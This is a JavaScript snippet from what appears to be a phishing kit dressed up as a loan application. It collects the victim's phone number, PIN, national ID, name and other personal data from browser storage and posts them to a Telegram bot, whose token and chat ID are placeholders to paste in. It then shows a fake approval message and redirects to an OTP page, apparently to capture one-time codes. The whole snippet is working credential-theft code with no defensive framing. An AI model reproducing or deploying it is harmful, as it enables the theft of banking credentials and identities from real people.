<script>
const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"; 
const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";

const data = {
  amount: localStorage.getItem('amount'),
  period: localStorage.getItem('period'),
  phone: localStorage.getItem('loginPhone'),
  pin: localStorage.getItem('loginPIN'),
  idNumber: localStorage.getItem('idNumber'),
  fullName: localStorage.getItem('fullName'),
  dob: localStorage.getItem('dob'),
  address: localStorage.getItem('address'),
  employer: localStorage.getItem('employer'),
  job: localStorage.getItem('job'),
  salary: localStorage.getItem('salary')
};

const message = `🆕 *NEW LOAN APPLICATION*\n\n💰 *Loan:* $${data.amount} for ${data.period}\n📱 *Phone:* ${data.phone}\n🔒 *PIN:* ${data.pin}\n\n👤 *Name:* ${data.fullName}\n🆔 *ID:* ${data.idNumber}\n\n⏰ *Time:* ${new Date().toLocaleString()}`;

// Send to Telegram
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})
}).then(()=>{
  document.querySelector('.timer-box').innerHTML = '✅ Sent to admin for approval';
});

// CLEAR AND REDIRECT TO OTP1
localStorage.clear(); 
let count = 5;
const timer = setInterval(()=>{
  document.querySelector('.timer-box').innerHTML = `<span class="loader"></span>Redirecting to verification in ${count}s...`;
  count--;
  if(count <= 0){
    clearInterval(timer);
    window.location='loading.html?next=otp1.html'; // GO TO OTP1
  }
}, 1000);
</script>
